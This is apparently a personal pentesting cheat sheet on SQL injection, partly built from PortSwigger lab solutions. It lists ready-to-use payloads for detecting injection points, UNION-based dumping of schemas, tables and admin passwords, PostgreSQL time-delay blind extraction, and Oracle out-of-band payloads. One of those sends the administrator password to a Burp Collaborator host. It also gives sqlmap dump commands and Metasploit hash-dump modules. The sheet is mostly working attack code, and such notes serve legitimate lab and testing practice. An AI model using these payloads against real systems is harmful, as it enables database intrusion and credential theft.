# Identify DBMS

## Manual detection of SQLi vulnerability
Test every entry points :
- single quote '
- boolean condition OR 1=1, OR 1=2 and look for difference in application behavior

# Manual database dumping
- Determine nb of columns (will fail if number > number of columns)
```
# ORDER BY method
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--

# UNION method
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```
- Find columns with string data (will fail if 'a' is on a non-string column)
```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```
- Retrieive database list
```
' UNION SELECT NULL,NULL,NULL,schema_name FROM information_schema.schemata'
```
- Retrieve table list
```
' UNION SELECT NULL,NULL,NULL,table_name FROM information_schema.tables WHERE table_schema="database"'
```
- Retrieve column list
```
' UNION SELECT NULL,NULL,NULL,column_name FROM information_schema.columns WHERE table_name="table"'
```
- Retrieve data from tables
```
' UNION SELECT NULL,NULL,NULL,username FROM database.table'
' UNION SELECT NULL,NULL,NULL,username FROM database.table WHERE id=1'
' UNION SELECT NULL,NULL,NULL,password FROM database.table WHERE username="admin"'
' UNION SELECT NULL,NULL,NULL,username FROM database.table LIMIT 1'
' UNION SELECT NULL,NULL,NULL,username FROM database.table LIMIT 1 OFFSET 2'
```

# sqlmap
- Basic SQLMap
```bash
sqlmap -u "http://url/avec?param=true" --batch
sqlmap -u "http://url/avec?param=true" --batch --cookie "KEY=Value"
# First: Save a raw request with Burpsuite or ZAP
sqlmap -r request.raw --batch --random-agent
```
- Dump database content
```bash
sqlmap -r request.raw --batch --random-agent -D database --dump
```

# metasploit
## Useful modules
- auxiliary/scanner/mysql/mysql_hashdump
- scanner/mysql/mysql_schemadump

## Blind SQLi with conditional errors
## Oracle
- Solution from lab @ portswigger academy
https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

# Blind SQLi with time delay
## PostgreSQL
```
'||pg_sleep(10)--

'||CASE WHEN ((SELECT COUNT(*) FROM USERS WHERE username='administrator')=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--

'||(SELECT CASE WHEN SUBSTR(password,1,20)='ra52nk91w82bclznk33j§a§' THEN pg_sleep(5) ELSE pg_sleep(0) END username FROM USERS WHERE username='administrator')--
```

# SQLi out of band
## Oracle
```
x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//fziulre2bwio5m8oo8sinod3uu0xom.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--

x'+UNION+SELECT+extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM "http://'||(SELECT+password+FROM+users+WHERE+username+=+'administrator')||'.8enn0ktvqpxhkfnh317b2hsw9nfs3h.burpcollaborator.net/"> %25remote%3b]>'),'/l') FROM dual--
```

# Links
___
## Guides
- https://portswigger.net/web-security/sql-injection/cheat-sheet

## Writeups
- 